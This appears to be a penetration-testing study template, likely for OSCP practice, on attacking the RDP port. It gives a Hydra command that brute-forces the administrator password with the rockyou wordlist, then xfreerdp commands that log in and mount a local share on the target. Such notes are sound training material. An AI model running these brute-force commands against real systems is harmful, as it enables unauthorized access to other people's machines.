There are two methods for this port: one involves finding credentials with another port, and the other employs brute force.

- There is only one method to find credentials on this port, which involves a brute force attack using #Hydra

```sh
 hydra -t 4 -l administrator -P /usr/share/wordlists/rockyou.txt rdp://<% tp.frontmatter["IPVictima"] %>
```

- then further login with xfreerdp

>[!example]  xfreerdp
>```sh
> xfreerdp /u:'Usuario' /p:'Password' /v:<% tp.frontmatter["IPVictima"] %> /dynamic-resolution /drive:"/home/kali/OSCP/Compartida/",Compartida
>```

>[!example]  xfreerdp - DOMINIO
>```sh
> xfreerdp /u:'Usuario' /p:'Password'  /d:dominio.yzx /v:<% tp.frontmatter["IPVictima"] %> /dynamic-resolution /drive:"/home/kali/OSCP/Compartida/",Compartida
>```
